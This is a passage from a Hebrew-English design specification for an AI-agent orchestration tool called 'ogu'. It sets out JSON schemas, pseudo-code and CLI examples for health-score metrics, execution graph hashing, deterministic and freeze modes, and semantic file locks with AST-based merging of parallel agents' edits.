**כלל ברזל:** כל failure domain מוגדר עם detection, circuit breaker, ו-failover. Audit failure = system halt. Filesystem failure = read-only mode. Provider failure = automatic failover. Kill switch = immediate checkpoint + halt. Resume requires CTO + consistency check.

---

### Closure 8: Formal Metrics Layer — Org Health Score

**הבעיה:** המערכת יודעת הכל על עצמה (audit, budget, performance) אבל לא יודעת לענות על: "איך החברה עכשיו?" שאלה אחת, תשובה אחת. בלי metrics layer פורמלי, אין SLA, אין KPIs, אין regression detection.

**קובץ חדש:** `docs/vault/02_Contracts/Metrics.contract.md`

**Schema: Metrics System**

```json
{
  "$schema": "MetricsSystem/1.0",

  "healthScores": {
    "company": {
      "name": "Org Health Score",
      "range": [0, 100],
      "formula": "weighted average of all component scores",
      "components": [
        { "metric": "feature_velocity",    "weight": 0.20 },
        { "metric": "budget_efficiency",   "weight": 0.15 },
        { "metric": "quality_score",       "weight": 0.25 },
        { "metric": "agent_productivity",  "weight": 0.15 },
        { "metric": "system_reliability",  "weight": 0.15 },
        { "metric": "governance_health",   "weight": 0.10 }
      ],
      "thresholds": {
        "healthy": [80, 100],
        "warning": [60, 79],
        "critical": [40, 59],
        "failing": [0, 39]
      }
    },

    "feature": {
      "name": "Feature Health Score",
      "range": [0, 100],
      "formula": "per-feature health based on progress, budget, quality",
      "components": [
        { "metric": "progress_vs_plan",     "weight": 0.25 },
        { "metric": "budget_utilization",   "weight": 0.20 },
        { "metric": "failure_rate",         "weight": 0.20 },
        { "metric": "gate_pass_rate",       "weight": 0.20 },
        { "metric": "time_in_state",        "weight": 0.15 }
      ]
    }
  },

  "kpis": [
    {
      "id": "feature_velocity",
      "name": "Feature Velocity",
      "description": "Features completed per week",
      "unit": "features/week",
      "calculation": "count(features where state transitioned to 'production' in last 7 days)",
      "target": 2.0,
      "warning": 1.0,
      "critical": 0.5
    },
    {
      "id": "budget_efficiency",
      "name": "Budget Efficiency",
      "description": "Actual cost vs estimated cost ratio",
      "unit": "ratio",
      "calculation": "sum(actual_cost) / sum(estimated_cost) for completed features",
      "target": 1.0,
      "warning": 1.5,
      "critical": 2.0,
      "note": "Lower is better. >1 means over budget."
    },
    {
      "id": "quality_score",
      "name": "Quality Score",
      "description": "Gate pass rate on first attempt",
      "unit": "percentage",
      "calculation": "(gates passed first try / total gate evaluations) * 100",
      "target": 85,
      "warning": 70,
      "critical": 50
    },
    {
      "id": "agent_productivity",
      "name": "Agent Productivity",
      "description": "Tasks completed per agent-hour",
      "unit": "tasks/hour",
      "calculation": "sum(tasks_completed) / sum(agent_active_hours)",
      "target": 3.0,
      "warning": 1.5,
      "critical": 0.5
    },
    {
      "id": "system_reliability",
      "name": "System Reliability",
      "description": "Percentage of transactions that complete without rollback",
      "unit": "percentage",
      "calculation": "(committed_transactions / total_transactions) * 100",
      "target": 95,
      "warning": 85,
      "critical": 70
    },
    {
      "id": "governance_health",
      "name": "Governance Health",
      "description": "Policy violations and override frequency",
      "unit": "score",
      "calculation": "100 - (policy_violations * 5) - (overrides * 2)",
      "target": 90,
      "warning": 70,
      "critical": 50
    },
    {
      "id": "mean_time_to_feature",
      "name": "Mean Time to Feature",
      "description": "Average time from draft to production",
      "unit": "hours",
      "calculation": "avg(time from draft→production transition)",
      "target": 48,
      "warning": 96,
      "critical": 168
    },
    {
      "id": "drift_index",
      "name": "Drift Index",
      "description": "How much production code drifts from spec",
      "unit": "percentage",
      "calculation": "ogu drift output aggregated across features",
      "target": 5,
      "warning": 15,
      "critical": 30
    }
  ],

  "slas": [
    {
      "id": "SLA-SCHEDULING",
      "name": "Task Scheduling SLA",
      "description": "P0 tasks must be scheduled within maxWait",
      "metric": "time from enqueue to schedule for P0 tasks",
      "target": "< 10s for P0, < 60s for P1, < 5min for P2",
      "measurement": "scheduler audit events",
      "breach": "escalate to CTO + emit alert"
    },
    {
      "id": "SLA-COMPILATION",
      "name": "Compilation SLA",
      "description": "ogu compile must complete within time budget",
      "metric": "compilation duration for 14 gates",
      "target": "< 10 min for features with < 20 tasks",
      "measurement": "compile audit events",
      "breach": "flag feature as slow + investigate"
    },
    {
      "id": "SLA-CONSISTENCY",
      "name": "Consistency SLA",
      "description": "All layers must be consistent within window",
      "metric": "max delta between audit and budget/allocation",
      "target": "< 5% delta at any time, 0% delta after reconciliation",
      "measurement": "consistency:check output",
      "breach": "auto-reconcile + alert if delta > 10%"
    },
    {
      "id": "SLA-RECOVERY",
      "name": "Recovery SLA",
      "description": "Time from failure detection to recovery",
      "metric": "circuit breaker open → closed duration",
      "target": "< 5 min for provider failover, < 1 min for resource recovery",
      "measurement": "circuit breaker audit events",
      "breach": "escalate to devops + increase failover chain"
    }
  ],

  "regressionDetection": {
    "description": "Automatically detect when KPIs are trending downward",
    "algorithm": "Sliding window comparison",
    "windows": {
      "short": "24 hours",
      "medium": "7 days",
      "long": "30 days"
    },
    "rules": [
      {
        "name": "velocity_regression",
        "condition": "feature_velocity.short < feature_velocity.medium * 0.7",
        "severity": "warning",
        "action": "emit alert + propose investigation"
      },
      {
        "name": "quality_regression",
        "condition": "quality_score.short < quality_score.long * 0.8",
        "severity": "critical",
        "action": "emit alert + auto-throttle new feature allocation"
      },
      {
        "name": "budget_regression",
        "condition": "budget_efficiency.short > budget_efficiency.long * 1.3",
        "severity": "warning",
        "action": "emit alert + review model routing decisions"
      },
      {
        "name": "reliability_regression",
        "condition": "system_reliability.short < 80",
        "severity": "critical",
        "action": "emit alert + increase consistency check frequency + escalate to CTO"
      }
    ]
  }
}
```

**Pseudo-code: metrics.mjs**

```javascript
// tools/ogu/commands/lib/metrics.mjs

import { audit } from './audit.mjs';
import { loadAllEnvelopes } from './feature-isolation.mjs';

const METRICS_HISTORY = '.ogu/metrics/';

/**
 * Calculate the Org Health Score — single number that answers "how's the company?"
 */
export function calculateOrgHealth(root) {
  const config = loadMetricsConfig();
  const kpiValues = {};

  // Calculate each KPI
  for (const kpi of config.kpis) {
    kpiValues[kpi.id] = calculateKPI(root, kpi);
  }

  // Calculate component scores (normalized to 0-100)
  const componentScores = {};
  for (const component of config.healthScores.company.components) {
    const kpi = kpiValues[component.metric];
    componentScores[component.metric] = normalizeToScore(kpi);
  }

  // Weighted average
  let totalWeight = 0;
  let weightedSum = 0;
  for (const component of config.healthScores.company.components) {
    const score = componentScores[component.metric];
    weightedSum += score * component.weight;
    totalWeight += component.weight;
  }

  const orgScore = Math.round(weightedSum / totalWeight);

  // Determine status
  const thresholds = config.healthScores.company.thresholds;
  let status = 'failing';
  if (orgScore >= thresholds.healthy[0]) status = 'healthy';
  else if (orgScore >= thresholds.warning[0]) status = 'warning';
  else if (orgScore >= thresholds.critical[0]) status = 'critical';

  // Save to history for regression detection
  saveMetricsSnapshot(root, {
    timestamp: new Date().toISOString(),
    orgScore,
    status,
    kpis: kpiValues,
    components: componentScores
  });

  return { orgScore, status, kpis: kpiValues, components: componentScores };
}

/**
 * Calculate Feature Health Score
 */
export function calculateFeatureHealth(root, featureSlug) {
  const config = loadMetricsConfig();
  const envelope = loadEnvelope(root, featureSlug);
  const state = loadFeatureState(root, featureSlug);

  const components = {
    progress_vs_plan: calculateProgress(root, featureSlug),
    budget_utilization: envelope ? (1 - envelope.budget.spent / envelope.budget.maxTotalCost) * 100 : 100,
    failure_rate: calculateFailureRate(root, featureSlug),
    gate_pass_rate: calculateGatePassRate(root, featureSlug),
    time_in_state: calculateTimeInStateScore(state)
  };

  let weightedSum = 0;
  let totalWeight = 0;
  for (const comp of config.healthScores.feature.components) {
    weightedSum += (components[comp.metric] || 50) * comp.weight;
    totalWeight += comp.weight;
  }

  return {
    featureSlug,
    score: Math.round(weightedSum / totalWeight),
    components,
    state: state.currentState
  };
}

/**
 * Check for regressions — compare current window to historical
 */
export function detectRegressions(root) {
  const config = loadMetricsConfig();
  const history = loadMetricsHistory(root);
  const current = calculateOrgHealth(root);
  const regressions = [];

  for (const rule of config.regressionDetection.rules) {
    const shortWindow = getWindowAverage(history, config.regressionDetection.windows.short, rule.name.replace('_regression', ''));
    const mediumWindow = getWindowAverage(history, config.regressionDetection.windows.medium, rule.name.replace('_regression', ''));
    const longWindow = getWindowAverage(history, config.regressionDetection.windows.long, rule.name.replace('_regression', ''));

    const regressed = evaluateRegressionCondition(rule.condition, {
      short: shortWindow,
      medium: mediumWindow,
      long: longWindow
    });

    if (regressed) {
      regressions.push({
        rule: rule.name,
        severity: rule.severity,
        action: rule.action,
        values: { short: shortWindow, medium: mediumWindow, long: longWindow }
      });

      audit.emit(root, {
        type: 'regression_detected',
        context: { rule: rule.name, severity: rule.severity, values: { short: shortWindow, medium: mediumWindow } }
      });
    }
  }

  return regressions;
}

/**
 * Check SLA compliance
 */
export function checkSLAs(root) {
  const config = loadMetricsConfig();
  const results = [];

  for (const sla of config.slas) {
    const measurement = measureSLA(root, sla);
    const breached = isSLABreached(sla, measurement);

    results.push({
      id: sla.id,
      name: sla.name,
      target: sla.target,
      actual: measurement.value,
      breached,
      details: measurement.details
    });

    if (breached) {
      audit.emit(root, {
        type: 'sla_breach',
        context: { slaId: sla.id, target: sla.target, actual: measurement.value }
      });
    }
  }

  return results;
}
```

**CLI Commands:**

```
ogu metrics:health                             ← Org Health Score dashboard
ogu metrics:health <slug>                      ← Feature Health Score
ogu metrics:kpis                               ← All KPIs with current values
ogu metrics:kpis --history --window 7d         ← KPI history over time
ogu metrics:sla                                ← SLA compliance dashboard
ogu metrics:regression                         ← Check for regressions
ogu metrics:regression --window 24h            ← Check short-window regressions
ogu metrics:export --format json               ← Export metrics for external dashboards
```

**Example:**
```
$ ogu metrics:health
ORG HEALTH SCORE: 82/100 (healthy)

  COMPONENT             SCORE    WEIGHT   KPI VALUE      TARGET
  ──────────────────── ──────── ──────── ──────────────── ─────────
  Feature Velocity       85       20%     2.1 feat/week   2.0 ✓
  Budget Efficiency      78       15%     1.12 ratio      1.0 ⚠
  Quality Score          90       25%     90% first-pass   85% ✓
  Agent Productivity     75       15%     2.8 tasks/hr    3.0 ⚠
  System Reliability     88       15%     94% committed    95% ⚠
  Governance Health      80       10%     score 80        90 ⚠

  FEATURES:
    auth-system          │ 74/100  │ building  │ budget: 25% │ failures: 2
    dashboard-v2         │ 91/100  │ reviewing │ budget: 45% │ failures: 0
    onboarding-flow      │ 60/100  │ planned   │ budget: 0%  │ 48h no progress ⚠

  REGRESSIONS:
    ⚠ budget_regression: efficiency 1.12 vs 30d avg 0.95 (+18%)
    → Action: review model routing decisions

  SLA COMPLIANCE:
    SLA-SCHEDULING     ✓ met (P0 avg: 3s, P1 avg: 22s)
    SLA-COMPILATION    ✓ met (avg: 4.2 min)
    SLA-CONSISTENCY    ✓ met (max delta: 2.1%)
    SLA-RECOVERY       ✓ met (last recovery: 45s)

$ ogu metrics:health auth-system
FEATURE HEALTH: auth-system — 74/100

  COMPONENT             SCORE    DETAILS
  ──────────────────── ──────── ──────────────────────────────
  Progress vs Plan       80%     8/15 tasks complete (53%), on track
  Budget Utilization     85%     $12.30/$50.00 (24.6% used, 53% done)
  Failure Rate           60%     2 failures in 10 tasks (20% fail rate)
  Gate Pass Rate         —       not yet in review
  Time in State          65%     38h in 'building' (limit: 168h)

  RECOMMENDATION: Failure rate above target. Consider capability upgrade for failing tasks.
```

**כלל ברזל:** Org Health Score = single number. 82 = healthy, 55 = critical. KPIs measured from audit events (source of truth). Regressions detected automatically. SLA breaches escalated. Every metric has a target, warning, and critical threshold.

---

### Enhancement 4: Execution Graph Hash

**הבעיה:** Execution Snapshot (Fix 3) תופס snapshot פר-task. אבל DAG שלם צריך hash אחד שמוכיח שכל ה-execution chain אינטגרלי.

**Schema: Execution Graph Hash**

```json
{
  "$schema": "ExecutionGraphHash/1.0",
  "featureSlug": "auth-system",
  "graphHash": "sha256:composite_of_all_below",
  "components": {
    "planHash": "sha256:Plan.json content hash",
    "policyVersionAtExecution": 7,
    "policyASTHash": "sha256:ast hash at execution start",
    "orgSpecVersion": "1.0.0",
    "orgSpecHash": "sha256:OrgSpec hash at execution start",
    "modelRoutingDecisions": [
      { "taskId": "task-1", "model": "claude-sonnet-4-6", "provider": "anthropic", "capabilityUsed": "code_generation" },
      { "taskId": "task-2", "model": "claude-opus-4-6", "provider": "anthropic", "capabilityUsed": "architect_review" }
    ],
    "modelDecisionSetHash": "sha256:hash of all routing decisions",
    "taskSnapshotHashes": {
      "task-1": "sha256:snapshot hash",
      "task-2": "sha256:snapshot hash"
    },
    "taskSnapshotChainHash": "sha256:ordered chain of all task hashes"
  },
  "replayGuarantee": "Identical graphHash = identical execution results (given same model responses)"
}
```

**Pseudo-code:**

```javascript
// tools/ogu/commands/lib/execution-graph.mjs

export function computeGraphHash(root, featureSlug) {
  const plan = loadPlan(root, featureSlug);
  const policyVersion = loadPolicyVersion(root);
  const orgSpec = loadOrgSpec(root);
  const snapshots = loadAllSnapshots(root, featureSlug);

  const components = {
    planHash: hashCanonical(plan),
    policyVersionAtExecution: policyVersion.current.version,
    policyASTHash: policyVersion.current.astHash,
    orgSpecVersion: orgSpec.org.version,
    orgSpecHash: hashCanonical(orgSpec.org),
    modelRoutingDecisions: extractRoutingDecisions(snapshots),
    taskSnapshotHashes: Object.fromEntries(
      snapshots.map(s => [s.taskId, s.hash])
    )
  };

  components.modelDecisionSetHash = hashCanonical(components.modelRoutingDecisions);
  components.taskSnapshotChainHash = hashCanonical(
    snapshots.sort((a, b) => a.taskId.localeCompare(b.taskId)).map(s => s.hash)
  );

  return {
    featureSlug,
    graphHash: hashCanonical(components),
    components
  };
}
```

**CLI:**
```
ogu graph:hash <slug>                          ← Compute execution graph hash
ogu graph:verify <slug> <expectedHash>         ← Verify graph hash matches
ogu graph:diff <slug> <hash1> <hash2>          ← Show what changed between two executions
```

---

### Enhancement 5: Deterministic Mode Flag

**הבעיה:** לפעמים צריך להריץ את המערכת ב-mode שבו אין surprises — לבדיקה פורמלית, ל-audit, או ל-compliance review.

**Schema: Deterministic Mode**

```json
{
  "$schema": "DeterministicMode/1.0",
  "active": true,
  "activatedAt": "ISO",
  "activatedBy": "cto",

  "locks": {
    "policies": "frozen — no rule changes",
    "orgSpec": "frozen — no role changes",
    "modelRouting": "pinned — exact model versions, no escalation",
    "capabilityRegistry": "frozen — no canary routing",
    "overrides": "blocked — no human overrides",
    "budgetLimits": "frozen — no limit changes"
  },

  "behavior": {
    "escalation": "disabled — tasks fail rather than escalate",
    "autoTransitions": "disabled — Kadima poll skipped",
    "learningSignals": "recorded but NOT applied",
    "orgEvolution": "proposals queued but NOT executed",
    "chaosTests": "allowed (explicitly requested)",
    "companySnapshot": "auto-captured at mode entry and exit"
  },

  "verification": {
    "description": "In deterministic mode, every execution must produce identical output given identical input",
    "enforcement": "execution-snapshot verify is mandatory for every task",
    "failurePolicy": "any non-determinism = halt task + escalate"
  }
}
```

**CLI:**
```
ogu mode:deterministic --enable                ← Enter deterministic mode (requires CTO)
ogu mode:deterministic --disable               ← Exit deterministic mode
ogu mode:status                                ← Show current mode
```

**Example:**
```
$ ogu mode:deterministic --enable
⚠ DETERMINISTIC MODE ACTIVATED

  LOCKED:
    ✓ Policies frozen (version 7)
    ✓ OrgSpec frozen (v1.0.0)
    ✓ Model routing pinned (no escalation)
    ✓ Overrides blocked
    ✓ Budget limits frozen

  DISABLED:
    ✗ Auto-escalation
    ✗ Auto-transitions
    ✗ Learning signal application
    ✗ Org evolution proposals

  COMPANY SNAPSHOT: company-snap-20260228-160000 (captured at entry)
  EXIT: ogu mode:deterministic --disable (will capture exit snapshot)
```

---

### Enhancement 6: Company Freeze

**הבעיה:** לפעמים צריך להקפיא את כל החברה — audit review, incident response, compliance check. לא halt (שמפסיק הכל) אלא freeze (שמרשה קריאה בלבד).

**Schema: Company Freeze**

```json
{
  "$schema": "CompanyFreeze/1.0",
  "frozen": true,
  "frozenAt": "ISO",
  "frozenBy": "cto",
  "reason": "Quarterly compliance audit",

  "allowedOperations": [
    "Read any file",
    "ogu metrics:*",
    "ogu audit:*",
    "ogu consistency:check",
    "ogu company:snapshot",
    "ogu company:status",
    "ogu status",
    "ogu feature:state --history"
  ],

  "blockedOperations": [
    "Any write operation",
    "Task scheduling",
    "Agent execution",
    "Budget changes",
    "Policy changes",
    "OrgSpec changes",
    "Feature transitions"
  ],

  "autoActions": {
    "onFreeze": [
      "Checkpoint all in-progress tasks",
      "Capture company snapshot",
      "Emit audit event",
      "Set system mode to 'frozen'"
    ],
    "onUnfreeze": [
      "Capture company snapshot (for diff)",
      "Run consistency:check",
      "Resume scheduler",
      "Emit audit event"
    ]
  }
}
```

**CLI:**
```
ogu company:freeze --reason "..."              ← Freeze (requires CTO)
ogu company:unfreeze                           ← Unfreeze (requires CTO + consistency check)
ogu company:freeze --status                    ← Check if frozen
```

**Example:**
```
$ ogu company:freeze --reason "Q1 compliance audit"
❄ COMPANY FROZEN

  Reason:    Q1 compliance audit
  Frozen by: cto
  Snapshot:  company-snap-20260228-163000

  CHECKPOINTED:
    ✓ 3 tasks checkpointed (auth-system: task-5, task-6; dashboard-v2: task-22)
    ✓ Scheduler paused
    ✓ All sessions set to frozen

  ALLOWED: read operations, metrics, audit, status
  BLOCKED: writes, scheduling, execution, changes

  UNFREEZE: ogu company:unfreeze (requires CTO)

$ ogu company:unfreeze
  ✓ Consistency check passed
  ✓ Company snapshot captured (diff: 0 changes during freeze)
  ✓ Scheduler resumed
  ✓ Sessions unfrozen
  ❄→✓ Company unfrozen
```

**כלל ברזל:** Freeze ≠ Halt. Freeze = read-only. Halt = emergency stop. Freeze is graceful — checkpoint, snapshot, pause. Unfreeze requires consistency check. Both require CTO.

---

## Iteration 6: The Absolute Horizon — חסינת-מציאות

> המעבר ממערכת דטרמיניסטית למערכת **חסינת-מציאות** (Reality-Fault Tolerant).
> ארבע closures שמטפלות לא בקונספטים, אלא ב**כישלונות שקורים בפרודקשן אמיתי** כשמריצים AI agents על scale.
> Git conflicts. Context decay. Silent model drift. Adversarial prompts.
> בלי הרבדים האלה, המערכת תשתק תחת הלחץ של חברה אמיתית עם 10,000 קבצים ו-50 סוכנים.

```
Closure 9:  Semantic Mutex & AST Merging — Git conflict prevention + intelligent code merge
Closure 10: Semantic Memory Fabric — Knowledge graph + RAG injection, corporate amnesia prevention
Closure 11: Functional Determinism Tolerance — AST-based hashing, auto-healing silent drift
Closure 12: MicroVM Execution Matrix — Hardware isolation, ephemeral VMs, network egress proxy
```

---

### Closure 9: Semantic Mutex & AST Merging

**הבעיה:** Phase 6 מקצה worktrees נפרדים לסוכנים. Wave 1 מריץ 3 סוכנים במקביל. Agent A נוגע ב-`users.ts` כדי להוסיף שדה, Agent B נוגע באותו קובץ כדי להוסיף מתודה. ה-`git merge` בסוף ה-Wave:
1. נכשל עם conflict → Wave stuck
2. מייצר קוד שבור → silent corruption
3. LLMs **גרועים** בפתרון Git conflicts טקסטואליים → deadlock

Resource Governor (Fix 4) מנהל slots, אבל **לא יודע מהו תוכן ה-files** שכל סוכן נוגע בהם. Feature Isolation (Closure 3) מגביל blast radius, אבל **לא מונע overlap בתוך אותו feature**.

**קבצים חדשים:**

```
.ogu/locks/semantic.json                       ← Active file-level semantic locks
tools/ogu/commands/lib/semantic-lock.mjs       ← File mutex + conflict prediction
tools/ogu/commands/lib/ast-merge.mjs           ← AST-aware code merging engine
tools/ogu/commands/merge.mjs                   ← CLI: merge:preview, merge:ast, merge:conflicts
docs/vault/02_Contracts/SemanticMerge.contract.md ← Merge contract
```

**Schema: Semantic Lock Registry**

```json
{
  "$schema": "SemanticLock/1.0",
  "locks": [
    {
      "lockId": "lock-a1b2c3",
      "file": "src/models/users.ts",
      "region": {
        "type": "full_file | function | class | export_block | lines",
        "identifier": "class UserModel",
        "startLine": 15,
        "endLine": 89
      },
      "heldBy": {
        "agentId": "myapp:backend:a1b2c3d4",
        "taskId": "task-5",
        "featureSlug": "auth-system",
        "waveId": "wave-1"
      },
      "acquiredAt": "ISO",
      "expectedDuration": 300000,
      "lockType": "exclusive | shared",
      "conflictsWithLocks": []
    }
  ],
  "pendingConflicts": [
    {
      "file": "src/models/users.ts",
      "agentA": "myapp:backend:a1b2c3d4",
      "agentB": "myapp:frontend:e5f6g7h8",
      "regionOverlap": true,
      "resolution": "split_to_separate_waves | region_lock | merge_strategy",
      "detectedAt": "ISO"
    }
  ]
}
```

**Schema: AST Merge Strategy**

```json
{
  "$schema": "ASTMerge/1.0",
  "description": "AST-based merging replaces line-based git merge for code files. Non-code files fall back to git merge.",

  "supportedLanguages": {
    "typescript": { "parser": "ts-morph", "astNodeTypes": ["function", "class", "interface", "variable", "import", "export", "type"] },
    "javascript": { "parser": "acorn", "astNodeTypes": ["function", "class", "variable", "import", "export"] },
    "json": { "parser": "json-parse", "astNodeTypes": ["key-value pair"] },
    "markdown": { "parser": "mdast", "astNodeTypes": ["heading", "paragraph", "list", "code_block"] },
    "css": { "parser": "postcss", "astNodeTypes": ["rule", "declaration", "at-rule"] }
  },

  "mergeRules": [
    {
      "scenario": "both_add_different_functions",
      "description": "Agent A adds funcA(), Agent B adds funcB() to same file",
      "strategy": "append_both",
      "conflictLevel": "none",
      "example": "Both additions are independent AST nodes → auto-merge"
    },
    {
      "scenario": "both_add_to_same_class",
      "description": "Agent A adds method to class, Agent B adds property to same class",
      "strategy": "merge_class_members",
      "conflictLevel": "low",
      "example": "Disjoint class members → auto-merge, sorted by type (properties first, then methods)"
    },
    {
      "scenario": "both_modify_same_function",
      "description": "Agent A changes function body line 3, Agent B changes line 7",
      "strategy": "line_merge_within_function",
      "conflictLevel": "medium",
      "example": "Non-overlapping changes within same function → merge with verification gate"
    },
    {
      "scenario": "both_modify_same_lines",
      "description": "Agent A and B both change the same expression",
      "strategy": "conflict_escalate",
      "conflictLevel": "high",
      "example": "Overlapping changes → escalate to architect role for resolution"
    },
    {
      "scenario": "import_conflict",
      "description": "Both agents add different imports",
      "strategy": "union_imports",
      "conflictLevel": "none",
      "example": "Imports are always mergeable → combine and deduplicate"
    },
    {
      "scenario": "type_conflict",
      "description": "Agent A adds field to interface, Agent B adds different field",
      "strategy": "union_type_members",
      "conflictLevel": "low",
      "example": "Interface/type extensions are additive → auto-merge"
    }
  ],

  "fallback": {
    "onUnsupportedLanguage": "git_merge_standard",
    "onParseFailure": "git_merge_standard",
    "onHighConflict": "escalate_to_architect",
    "onArchitectFailure": "split_tasks_to_sequential"
  }
}
```

**Pseudo-code: semantic-lock.mjs**

```javascript
// tools/ogu/commands/lib/semantic-lock.mjs

import { loadPlan } from './plan-loader.mjs';
import { audit } from './audit.mjs';
import { createHash } from 'crypto';

const LOCK_PATH = '.ogu/locks/semantic.json';

/**
 * Pre-wave conflict detection.
 * Called by Kadima BEFORE assigning agents to a wave.
 * Returns file-level overlap map.
 */
export function detectWaveConflicts(root, wave) {
  const touchMap = new Map(); // file → [taskIds]

  for (const task of wave.tasks) {
    const files = task.touches || task.expectedOutputs?.map(o => o.path) || [];
    for (const file of files) {
      if (!touchMap.has(file)) touchMap.set(file, []);
      touchMap.get(file).push({
        taskId: task.id,
        agentId: task.assignedTo,
        touchType: inferTouchType(task, file)
      });
    }
  }

  const conflicts = [];
  for (const [file, touches] of touchMap) {
    if (touches.length > 1) {
      // Multiple agents touching same file in same wave
      const regionOverlap = checkRegionOverlap(root, file, touches);

      conflicts.push({
        file,
        agents: touches.map(t => t.agentId),
        tasks: touches.map(t => t.taskId),
        regionOverlap,
        severity: regionOverlap ? 'high' : 'low',
        recommendation: regionOverlap
          ? 'split_to_separate_waves'
          : 'allow_with_ast_merge'
      });
    }
  }

  return { conflicts, hasBlockingConflicts: conflicts.some(c => c.severity === 'high') };
}

/**
 * Acquire semantic lock on a file/region before agent execution.
 */
export function acquireLock(root, { file, region, agentId, taskId, featureSlug, waveId }) {
  const locks = loadLocks(root);

  // Check for existing lock
  const existing = locks.locks.find(l =>
    l.file === file &&
    (l.lockType === 'exclusive' || region?.type === 'full_file') &&
    regionsOverlap(l.region, region)
  );

  if (existing) {
    return {
      granted: false,
      error: `OGU4301: File '${file}' locked by agent '${existing.heldBy.agentId}' (task ${existing.heldBy.taskId})`,
      existingLock: existing,
      suggestion: 'Wait for lock release or split to next wave'
    };
  }

  const lock = {
    lockId: `lock-${createHash('sha256').update(file + agentId + Date.now()).digest('hex').slice(0, 8)}`,
    file,
    region: region || { type: 'full_file' },
    heldBy: { agentId, taskId, featureSlug, waveId },
    acquiredAt: new Date().toISOString(),
    expectedDuration: 300000,
    lockType: region?.type === 'full_file' ? 'exclusive' : 'shared'
  };

  locks.locks.push(lock);
  saveLocks(root, locks);

  audit.emit(root, {
    type: 'semantic_lock_acquired',
    context: { lockId: lock.lockId, file, agentId, region: lock.region }
  });

  return { granted: true, lockId: lock.lockId };
}

/**
 * Release lock after agent completes task
 */
export function releaseLock(root, lockId) {
  const locks = loadLocks(root);
  locks.locks = locks.locks.filter(l => l.lockId !== lockId);
  saveLocks(root, locks);
}

/**
 * Kadima hook: reorder wave tasks to minimize conflicts
 */
export function optimizeWaveAssignment(root, plan) {
  const waves = plan.waves || buildWaves(plan);
  const optimized = [];

  for (const wave of waves) {
    const { conflicts, hasBlockingConflicts } = detectWaveConflicts(root, wave);

    if (!hasBlockingConflicts) {
      optimized.push(wave);
      continue;
    }

    // Split conflicting tasks to separate sub-waves
    const { subWaves } = splitByConflicts(wave, conflicts);
    optimized.push(...subWaves);

    audit.emit(root, {
      type: 'wave_split_for_conflicts',
      context: {
        originalWave: wave.id,
        conflicts: conflicts.length,
        resultingWaves: subWaves.length
      }
    });
  }

  return optimized;
}

function regionsOverlap(regionA, regionB) {
  if (!regionA || !regionB) return true; // full_file overlaps with anything
  if (regionA.type === 'full_file' || regionB.type === 'full_file') return true;
  if (regionA.identifier && regionB.identifier) {
    return regionA.identifier === regionB.identifier;
  }
  // Line range overlap
  return regionA.startLine <= regionB.endLine && regionB.startLine <= regionA.endLine;
}
```

**Pseudo-code: ast-merge.mjs**

```javascript
// tools/ogu/commands/lib/ast-merge.mjs

import { audit } from './audit.mjs';

/**
 * AST-aware merge of two branches that modified the same file.
 * Returns merged code or escalation request.
 */
export function mergeFileAST(baseContent, branchAContent, branchBContent, { language, file }) {
  const parser = getParser(language);
  if (!parser) {
    // Unsupported language — fallback to git merge
    return { strategy: 'git_fallback', merged: null, reason: `No AST parser for ${language}` };
  }

  let baseAST, astA, astB;
  try {
    baseAST = parser.parse(baseContent);
    astA = parser.parse(branchAContent);
    astB = parser.parse(branchBContent);
  } catch (parseError) {
    return { strategy: 'git_fallback', merged: null, reason: `Parse error: ${parseError.message}` };
  }

  // Compute diffs as AST operations
  const diffA = computeASTDiff(baseAST, astA);
  const diffB = computeASTDiff(baseAST, astB);

  // Classify changes
  const changesA = classifyChanges(diffA);
  const changesB = classifyChanges(diffB);

  // Detect conflicts at AST node level
  const conflicts = detectASTConflicts(changesA, changesB);

  if (conflicts.length === 0) {
    // Clean merge — apply both diffs to base
    const merged = applyASTDiffs(baseAST, [diffA, diffB]);
    const mergedCode = parser.serialize(merged);

    audit.emit(null, {
      type: 'ast_merge_success',
      context: {
        file,
        changesA: changesA.length,
        changesB: changesB.length,
        strategy: 'auto_merge'
      }
    });

    return { strategy: 'auto_merge', merged: mergedCode, conflicts: [] };
  }

  // Has conflicts — classify severity
  const highConflicts = conflicts.filter(c => c.level === 'high');
  const lowConflicts = conflicts.filter(c => c.level !== 'high');

  if (highConflicts.length === 0) {
    // Only low conflicts — merge with heuristics
    const merged = applyASTDiffsWithHeuristics(baseAST, [diffA, diffB], lowConflicts);
    const mergedCode = parser.serialize(merged);

    return {
      strategy: 'heuristic_merge',
      merged: mergedCode,
      conflicts: lowConflicts,
      requiresVerification: true // Must pass compile gate after merge
    };
  }

  // High conflicts — escalate
  return {
    strategy: 'escalate',
    merged: null,
    conflicts: highConflicts,
    escalateTo: 'architect',
    context: {
      file,
      baseSnippet: extractConflictRegion(baseContent, highConflicts[0]),
      branchASnippet: extractConflictRegion(branchAContent, highConflicts[0]),
      branchBSnippet: extractConflictRegion(branchBContent, highConflicts[0])
    }
  };
}

/**
 * Compute structural diff between two ASTs
 * Returns list of { nodeType, operation, path, content }
 */
function computeASTDiff(baseAST, modifiedAST) {
  const diffs = [];

  const baseNodes = flattenAST(baseAST);
  const modNodes = flattenAST(modifiedAST);

  // Find added nodes (in modified but not in base)
  for (const node of modNodes) {
    if (!baseNodes.find(b => b.id === node.id)) {
      diffs.push({ operation: 'add', nodeType: node.type, path: node.path, content: node });
    }
  }

  // Find removed nodes (in base but not in modified)
  for (const node of baseNodes) {
    if (!modNodes.find(m => m.id === node.id)) {
      diffs.push({ operation: 'remove', nodeType: node.type, path: node.path, content: node });
    }
  }

  // Find modified nodes (same id, different content hash)
  for (const node of modNodes) {
    const baseNode = baseNodes.find(b => b.id === node.id);
    if (baseNode && baseNode.contentHash !== node.contentHash) {
      diffs.push({
        operation: 'modify',
        nodeType: node.type,
        path: node.path,
        before: baseNode,
        after: node
      });
    }
  }

  return diffs;
}

/**
 * Detect conflicts between two sets of AST changes
 */
function detectASTConflicts(changesA, changesB) {
  const conflicts = [];

  for (const a of changesA) {
    for (const b of changesB) {
      // Same node modified by both
      if (a.operation === 'modify' && b.operation === 'modify' && a.path === b.path) {
        conflicts.push({
          level: 'high',
          type: 'same_node_modified',
          path: a.path,
          nodeType: a.nodeType,
          changeA: a,
          changeB: b
        });
      }

      // One adds, other modifies parent
      if (a.operation === 'add' && b.operation === 'modify' && isChildOf(a.path, b.path)) {
        conflicts.push({
          level: 'low',
          type: 'add_into_modified_parent',
          path: a.path,
          parentPath: b.path,
          changeA: a,
          changeB: b
        });
      }

      // Both add to same parent with potential ordering issues
      if (a.operation === 'add' && b.operation === 'add' && sameParent(a.path, b.path)) {
